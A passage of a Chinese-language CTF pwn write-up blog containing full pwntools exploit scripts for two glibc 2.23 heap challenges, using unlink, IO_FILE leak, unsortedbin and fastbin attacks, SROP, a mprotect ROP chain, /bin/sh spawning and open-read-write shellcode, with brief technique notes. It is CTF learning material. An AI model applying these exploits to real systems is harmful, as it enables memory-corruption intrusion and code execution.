class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice&gt;&gt; \n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    c(idx)</span><br><span class="line">    sa(<span class="string">"Please input car's name: \n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Please input car's index: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input name: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input car's index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">down</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up1</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">"Car's Speed is "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ru(<span class="string">"Km/h"</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up2</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    ru(<span class="string">"Car's Speed is "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ru(<span class="string">"Km/h"</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlicense</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">6</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">8</span>)</span><br><span class="line">    ru(<span class="string">"gift: "</span>)</span><br><span class="line">    heap_base = int(r(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    heap_base = (heap_base &gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">12</span></span><br><span class="line">    new(<span class="number">3</span>, <span class="string">"3"</span>*<span class="number">0x4</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>) <span class="comment">#1</span></span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0xf0</span>,</span><br><span class="line">        heap_base+<span class="number">0x58</span><span class="number">-0x18</span>,</span><br><span class="line">        heap_base+<span class="number">0x58</span><span class="number">-0x10</span>,</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">3</span>,</span><br><span class="line">        <span class="number">0x1234</span></span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>)</span><br><span class="line">    payload += p64(<span class="number">0xf0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">        down(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up1(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up2(<span class="number">0</span>)</span><br><span class="line">    up1(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">7</span>,</span><br><span class="line">        <span class="number">0x1234</span>,</span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x220</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    new(<span class="number">3</span>, payload)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x68</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        heap_base+<span class="number">0x2b0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x101</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x221</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload) <span class="comment">#0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">        down(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up1(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up2(<span class="number">1</span>)</span><br><span class="line">    up1(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        heap_base + <span class="number">0x270</span>,</span><br><span class="line">        <span class="number">0x220</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">"Car 1's name: "</span>)</span><br><span class="line">    main_arena = uu64(r(<span class="number">6</span>))<span class="number">-88</span></span><br><span class="line">    libc.address = main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    __free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        heap_base + <span class="number">0x2e0</span>,</span><br><span class="line">        <span class="number">0x220</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    new(<span class="number">3</span>, <span class="string">"aaa\n"</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">2</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        heap_base + <span class="number">0x2e0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        <span class="number">0x231</span>,</span><br><span class="line">        main_arena+<span class="number">88</span>,</span><br><span class="line">        heap_base</span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    new(<span class="number">3</span>, p64(<span class="number">0</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span>,</span><br><span class="line">        p64(<span class="number">0x220</span>),</span><br><span class="line">        p64(__free_hook),</span><br><span class="line">        p32(<span class="number">0</span>),</span><br><span class="line">        <span class="string">'\n'</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    getlicense(<span class="number">1</span>, p64(system))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    lg(<span class="string">"main_arena"</span>, main_arena)</span><br><span class="line">    lg(<span class="string">"heap_base"</span>, heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="unctf-orwpwn"><a href="#unctf-orwpwn" class="headerlink" title="unctf ## orwpwn"></a>unctf ## orwpwn</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+]      libc.addressess--&gt;0x7f4fabd43000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;123456&#125;</span><br></pre></td></tr></table></figure><p>先放上成功结果</p><h3 id="新点"><a href="#新点" class="headerlink" title="新点"></a>新点</h3><h4 id="mprotect改内存页权限"><a href="#mprotect改内存页权限" class="headerlink" title="mprotect改内存页权限"></a>mprotect改内存页权限</h4><p>以前不知道这个姿势，知道后感觉挺骚的，挺强的一个方法<br>mprotect传入参数后，能让指定内存页变成可执行，所以利用方式</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbGFuZF9TdW4vYXJ0aWNsZS9kZXRhaWxzLzMzNzI4OTU1" title="https://blog.csdn.net/Roland_Sun/article/details/33728955">mprotect改内存页权限<i class="fa fa-external-link"></i></span></p><ol><li>知道一个内存页的地址</li><li>这个内存页内容可控</li></ol><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnJjaGFwbWFuLm9yZy9wb3N0cy9MaW51eF9TeXN0ZW1fQ2FsbF9UYWJsZV9mb3JfeDg2XzY0Lw==" title="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">x64系统调用表<i class="fa fa-external-link"></i></span></p><h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>这个我以前也很怕的，这次自己写了下好像也就那样嘛，不会很复杂的，通常来说，你只要自己调试下就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(shellcode)</span><br><span class="line">    print(asm(shellcode, arch=<span class="string">'amd64'</span>))</span><br></pre></td></tr></table></figure><p>可以通过context设置平台，context.arch=’amd64’<br>我这里没设置，所以就用每次加个amd64</p><p>打开flag文件部分，大概就是</p><ol><li>设置rax=2</li><li>rdi = filename</li><li>rsi = 0 #标志只读方式</li><li>rdx = 0 # mode其实可以不填，所以，不用设置也可以</li><li>rax=2 # 系统中断号</li><li>调用syscall</li></ol><p>后面几个流程差不多，看下中断表就行</p><p>自己写的话</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>然后我为了省事，直接用shellcraft.amd64.open(‘flag’)生成了</p><p>接下来读取函数，因为返回了fd，存在rax里，所以第一步要保存rax值到rdi里</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>在接下来写函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><img src="https://github.com/NoOne-hub/picture/blob/master/orw-2.png" alt="系统调用表"></p><p>最后推荐篇文章<br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY0NQ==" title="https://xz.aliyun.com/t/6645">shellcode编写<i class="fa fa-external-link"></i></span></p><p>感觉总结得挺好的</p><h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p>这部分可以去看下ctf-wiki吧</p><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L3N0YWNrb3ZlcmZsb3cvYWR2YW5jZWQtcm9wLXpoLyNzcm9w" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop">SROP攻击<i class="fa fa-external-link"></i></span></p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><h4 id="准备部分"><a href="#准备部分" class="headerlink" title="准备部分"></a>准备部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) == (size+<span class="number">1</span>):</span><br><span class="line">        sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="IO-file攻击"><a href="#IO-file攻击" class="headerlink" title="IO_file攻击"></a>IO_file攻击</h4><p>这部分就是通过溢出，修改size,然后free掉一个fake的，最后通过IO_file攻击泄露地址，<br>这部分我是拿的ex师傅的部分的，我自己也写了个这部分的，利用chunk extends，搞复杂了，那会，感觉这个简洁些</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x68</span>, <span class="string">'1'</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x78</span>, <span class="string">'2'</span>) <span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x78</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xa1</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x98</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0x8620</span><span class="number">-0x40</span><span class="number">-0x3</span>))</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> ) <span class="comment">#3</span></span><br><span class="line">r(<span class="number">0x88</span>)</span><br><span class="line">libc.address = uu64(r(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">lg(<span class="string">"libc.addressess"</span>, libc.address)</span><br></pre></td></tr></table></figure><h4 id="unsortedbin攻击"><a href="#unsortedbin攻击" class="headerlink" title="unsortedbin攻击"></a>unsortedbin攻击</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">new(<span class="number">0x88</span>, <span class="string">'2'</span>) <span class="comment">#2</span></span><br></pre></td></tr></table></figure><h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><p>这里有个点点一下，就是srop部分，因为setcontext最后一句xor eax,eax，再加上syscall就是相当于调用read,<br>rdi 第一个参数 fd<br>rsi 第二个参数 buf<br>rdx 第三个参数 count 大小<br>rsp 执行完后的rsp<br>rip 就是 执行syscall加ret</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x13</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span> <span class="comment"># fd为0</span></span><br><span class="line">frame.rsi = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rip = libc.address + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line">new(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x60</span>])</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">3</span> + p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br></pre></td></tr></table></figure><h4 id="mprotect修改内存页权限"><a href="#mprotect修改内存页权限" class="headerlink" title="mprotect修改内存页权限"></a>mprotect修改内存页权限</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> layout = [</span><br><span class="line">     libc.address + <span class="number">0x0000000000021102</span>, <span class="comment">#: pop rdi; ret; </span></span><br><span class="line">     libc.symbols[<span class="string">'__free_hook'</span>] &amp; <span class="number">0xfffffffffffff000</span>, <span class="comment"># 开始地址</span></span><br><span class="line">     libc.address + <span class="number">0x00000000000202e8</span>, <span class="comment">#: pop rsi; ret; </span></span><br><span class="line">     <span class="number">0x2000</span>, <span class="comment"># 空间大小</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000001b92</span>, <span class="comment">#: pop rdx; ret;  </span></span><br><span class="line">     <span class="number">7</span>, <span class="comment"># rwx可读可写可执行</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000033544</span>, <span class="comment">#: pop rax; ret; </span></span><br><span class="line">     <span class="number">10</span>, <span class="comment">#mprotect调用号</span></span><br><span class="line">     libc.address + <span class="number">0x00000000000bc375</span>, <span class="comment">#: syscall; ret;</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000002a71</span>, <span class="comment">#: jmp rsp; </span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><h4 id="shellcode-jmp-rsp"><a href="#shellcode-jmp-rsp" class="headerlink" title="shellcode jmp rsp"></a>shellcode jmp rsp</h4><p>第一份shellcode ex师傅的<br>第二份用pwntools加自己编写一些<br>第三份纯自己写一遍</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br></pre></td></tr></table></figure><h4 id="getshell走起"><a href="#getshell走起" class="headerlink" title="getshell走起"></a>getshell走起</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s(flat(layout) + shellcode)</span><br></pre></td></tr></table></figure><p>。。。好像不能啊,只能特么的读flag，没意思</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'192.168.150.135'</span> </span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.97OiO1SVl1/pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE 